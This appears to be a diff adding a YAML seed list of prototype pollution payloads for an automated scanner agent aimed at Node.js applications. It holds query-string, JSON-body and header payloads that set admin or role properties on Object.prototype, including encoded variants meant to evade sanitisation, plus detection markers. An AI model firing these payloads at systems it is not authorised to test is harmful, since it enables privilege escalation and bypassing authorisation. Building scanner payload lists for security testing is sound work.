@@ -1,0 +1,86 @@
+# Prototype pollution payloads — seed list for the prototype pollution agent
+#
+# Used against JavaScript server-side applications (Node.js) where user-controlled
+# keys are merged into objects without sanitisation. Successful pollution modifies
+# Object.prototype, causing injected properties to appear on every subsequently
+# created plain object in the process.
+#
+# The agent probes via query string first (easiest to test), then JSON body (most
+# impactful), then headers. Detection payloads use a unique marker value so that any
+# reflection of that marker in a response body or downstream behaviour confirms pollution.
+#
+# Safety note: the detection payloads are designed to produce observable side effects
+# (reflected value) without causing denial-of-service or persistent state corruption.
+
+payloads:
+  query_string:
+    # Standard __proto__ bracket notation in query string
+    - "__proto__[admin]=1"
+    - "__proto__[isAdmin]=true"
+    - "__proto__[role]=admin"
+    - "__proto__[authorized]=true"
+    - "__proto__[polluted]=yes"
+    # constructor.prototype chain
+    - "constructor[prototype][admin]=1"
+    - "constructor[prototype][isAdmin]=true"
+    - "constructor[prototype][role]=admin"
+    # Nested depth — some merge utilities recurse only two levels
+    - "a[__proto__][admin]=1"
+    - "a[b][__proto__][admin]=1"
+    # URL-encoded variants — bypass middleware that blocks the literal string __proto__
+    - "__pro%74o__[admin]=1"
+    - "__pro%74o__[isAdmin]=true"
+    - "constructor%5bprototype%5d%5badmin%5d=1"
+
+  json_body:
+    # Direct __proto__ override in a JSON merge payload
+    - '{"__proto__": {"admin": true}}'
+    - '{"__proto__": {"isAdmin": true}}'
+    - '{"__proto__": {"role": "admin"}}'
+    - '{"__proto__": {"authorized": true}}'
+    # constructor.prototype variant — affects libraries that clone via constructor
+    - '{"constructor": {"prototype": {"admin": true}}}'
+    - '{"constructor": {"prototype": {"isAdmin": true}}}'
+    - '{"constructor": {"prototype": {"role": "admin"}}}'
+    # Deep merge variant — triggers recursive merge utilities
+    - '{"a": {"__proto__": {"admin": true}}}'
+    - '{"a": {"b": {"__proto__": {"admin": true}}}}'
+    # Nested within an array element — targets utilities that merge array items
+    - '[{"__proto__": {"admin": true}}]'
+    # JSON with unicode escape to evade string-based sanitisation
+    - "{\"\\u005f\\u005fproto\\u005f\\u005f\": {\"admin\": true}}"
+
+  headers:
+    # Some frameworks expose request headers as properties on the req object and
+    # pass them through a merge utility. A malicious header name or value can
+    # pollute the prototype if the header key is not sanitised before merging.
+    #
+    # Each entry is a "header-name: value" pair — the agent sends these as
+    # additional request headers.
+    - "__proto__: {\"admin\":true}"
+    - "constructor: {\"prototype\":{\"admin\":true}}"
+    # X-HTTP-Method-Override combined with pollution — targets frameworks that
+    # process the override header through a property merge
+    - "X-HTTP-Method-Override: PUT"
+    - "X-HTTP-Method-Override: PATCH"
+    - "X-Method-Override: PUT"
+
+  detection:
+    # Payloads that produce a detectable side effect without altering critical
+    # application behaviour. The agent inspects the response (and subsequent
+    # requests in the same session) for the presence of injected_marker_12345.
+    # If the marker appears where no user input was supplied, prototype pollution
+    # has been confirmed.
+    - "__proto__[x]=injected_marker_12345"
+    - "__proto__[testKey]=injected_marker_12345"
+    - "constructor[prototype][x]=injected_marker_12345"
+    - '{"__proto__": {"x": "injected_marker_12345"}}'
+    - '{"constructor": {"prototype": {"x": "injected_marker_12345"}}}'
+    # Targets frameworks that expose error messages — pollutes toString or valueOf
+    - "__proto__[toString]=injected_marker_12345"
+    - '{"__proto__": {"toString": "injected_marker_12345"}}'
+
+# Detection signatures — matched against raw response body (case-insensitive)
+match_signatures:
+  - 'injected_marker_12345'
+  - 'polluted'
